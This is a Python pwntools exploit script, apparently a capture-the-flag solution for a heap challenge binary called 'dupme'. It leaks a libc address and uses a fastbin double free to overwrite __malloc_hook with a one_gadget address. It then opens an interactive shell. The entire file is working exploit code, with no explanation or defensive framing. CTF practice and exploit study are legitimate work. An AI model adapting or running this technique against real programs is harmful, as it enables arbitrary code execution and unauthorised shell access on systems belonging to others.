from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']
p=process("./dupme")
libc = ELF("./libc.so.6")
#gdb.attach(p)
context.arch="amd64"

def malloc(ind, size, payload):
    global p
    r1 = p.sendlineafter(b">", "1")
    r2 = p.sendlineafter(b">", str(ind))
    r3 = p.sendlineafter(b">", str(size))
    r4 = p.sendlineafter(b">",payload)
    return r1+r2+r3+r4

def malloclast(ind, size, payload):
    global p
    r1 = p.sendlineafter(b">", "1")
    r2 = p.sendlineafter(b">", str(ind))
    r3 = p.sendlineafter(b">", str(size))
    return r1+r2+r3

def free(ind):
    global p
    r1 = p.sendlineafter(b">", "2")
    r2 = p.sendlineafter(b">", str(ind))
    return r1 + r2

def edit(ind, payload):
    global p
    r1 = p.sendlineafter(b">","3")
    r2 = p.sendlineafter(b">",str(ind))
    r3 = p.sendlineafter(b">",payload)
    return r1+r2+r3

def view(ind):
    global p
    r1 = p.sendlineafter(b">", "4")
    r1 = p.sendlineafter(b">", "4")
    r2 = p.sendlineafter(b">", str(ind))
    leak = p.recvuntil(b"addresses.");
    return leak

p.recvuntil(b"0x")
leak = p.recvuntil("\n")
intleak = int(leak,16)
print(hex(intleak))

libc.address = intleak - libc.sym.printf
print(hex(libc.address))

for i in range(9):
   print(malloc(i,104,"junk"))

for i in range(7):
    free(i)

free(7)
free(8)
free(7)

for i in range(7):
   malloc(i, 104, "data")

malloc(9, 104, p64(libc.sym.__malloc_hook - 35))
malloc(10, 104, "data")
malloc(11, 104, "data")
malloc(12, 104, b'a'*35 + p64(0xe27a1 + libc.address))
malloclast(13, 104, "data")
p.interactive()
